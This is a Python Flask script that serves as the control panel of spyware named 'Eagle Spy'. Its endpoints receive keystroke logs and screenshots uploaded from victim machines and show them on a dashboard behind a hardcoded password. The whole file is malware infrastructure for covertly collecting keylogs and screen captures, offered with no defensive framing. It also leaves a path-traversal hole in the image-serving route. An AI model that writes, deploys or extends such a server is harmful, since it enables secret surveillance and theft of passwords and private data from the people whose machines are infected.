
from flask import Flask, request, render_template_string, send_file, redirect, url_for, session
import os
from datetime import datetime
import sys

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 5000
PASSWORD = "kader11000"

try:
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])
except IndexError:
    SERVER_HOST = DEFAULT_HOST
    SERVER_PORT = DEFAULT_PORT

app = Flask(__name__)
app.secret_key = "super_secret_key_for_session"

os.makedirs("logs", exist_ok=True)
os.makedirs("screens", exist_ok=True)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            session["authenticated"] = True
            return redirect("/dashboard")
    return render_template_string("""
    <html>
    <head>
        <title>Login - Eagle Spy</title>
        <style>
            body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
            input { padding: 10px; font-size: 16px; }
        </style>
    </head>
    <body>
        <h2>Enter Password to Access Eagle Spy</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Password" />
            <input type="submit" value="Login" />
        </form>
    </body>
    </html>
    """)

@app.route("/dashboard")
def dashboard():
    if not session.get("authenticated"):
        return redirect("/")
    try:
        with open("logs/keylog.txt", "r", encoding="utf-8") as f:
            keylog = f.read()
    except FileNotFoundError:
        keylog = "No logs yet."
    screenshots = sorted(os.listdir("screens"), reverse=True)[0:10]
    return render_template_string("""
    <html>
    <head>
        <title>Eagle Spy - Dashboard</title>
        <style>
            body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
            h1 { color: #0ff; text-align: center; border-bottom: 2px solid #0ff; padding-bottom: 10px; }
            img { border: 2px solid #0f0; margin-bottom: 10px; }
            pre { background-color: #000; padding: 10px; border: 1px solid #0f0; overflow-x: auto; }
        </style>
    </head>
    <body>
        <h1>EAGLE SPY CONTROL PANEL - BY kader11000</h1>
        <h2>Keylogs:</h2>
        <pre>{{ keylog }}</pre>
        <h2>Screenshots:</h2>
        {% for img in screenshots %}
            <img src="/screens/{{ img }}" width="400"><br>
        {% endfor %}
    </body>
    </html>
    """, keylog=keylog, screenshots=screenshots)

@app.route("/upload_keys", methods=["POST"])
def upload_keys():
    keys = request.form.get("keys", "")
    with open("logs/keylog.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} - {keys}\n")
    return "OK"

@app.route("/upload_screenshot", methods=["POST"])
def upload_screenshot():
    screenshot = request.files.get("screenshot")
    if screenshot:
        filename = f"screens/{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename)
    return "OK"

@app.route("/screens/<img>")
def serve_image(img):
    return send_file(f"screens/{img}")

if __name__ == "__main__":
    print(f"[*] Starting server on {SERVER_HOST}:{SERVER_PORT}")
    app.run(host=SERVER_HOST, port=SERVER_PORT)
